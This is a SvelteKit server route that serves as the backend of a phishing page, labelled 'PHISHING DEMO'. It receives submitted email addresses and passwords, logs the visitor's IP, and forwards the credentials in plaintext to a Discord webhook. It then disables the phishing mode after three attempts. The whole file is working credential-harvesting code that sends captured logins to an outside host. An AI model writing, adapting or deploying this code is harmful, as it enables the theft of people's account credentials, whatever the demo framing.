import { json } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { env } from '$env/dynamic/private';
import { db } from '$lib/server/db';
import { siteStatus } from '$lib/server/db/schema';
import { eq } from 'drizzle-orm';

export const POST: RequestHandler = async ({ request }) => {
	try {
		const { email, password, attempt } = await request.json();

		// Get Discord webhook URL from env
		const webhookUrl = env.DISCORD_WEBHOOK_URL;

		if (webhookUrl) {
			// Send to Discord via webhook
			const timestamp = new Date().toISOString();
			const ip =
				request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown';

			const message = {
				content: `**PHISHING DEMO - Attempt ${attempt || '?'}/3**\n\`\`\`\nEmail: ${email}\nPassword: ${password}\nTime: ${timestamp}\nIP: ${ip}\n\`\`\`${attempt >= 3 ? '\n*Max attempts reached - phishing mode disabled*' : ''}`
			};

			// Post to Discord webhook
			const response = await fetch(webhookUrl, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json'
				},
				body: JSON.stringify(message)
			});

			if (!response.ok) {
				console.error('Discord webhook error:', response.status, await response.text());
			}
		} else {
			console.error('Missing DISCORD_WEBHOOK_URL in .env');
		}

		// Auto-disable phishing mode after 3rd attempt
		if (attempt >= 3) {
			try {
				await db.update(siteStatus).set({ phishingMode: 'false' }).where(eq(siteStatus.id, 1));
			} catch (dbError) {
				// Column might not exist yet, ignore
			}
		}

		return json({ success: true });
	} catch (error) {
		console.error('Phishing capture error:', error);
		return json({ success: false }, { status: 500 });
	}
};
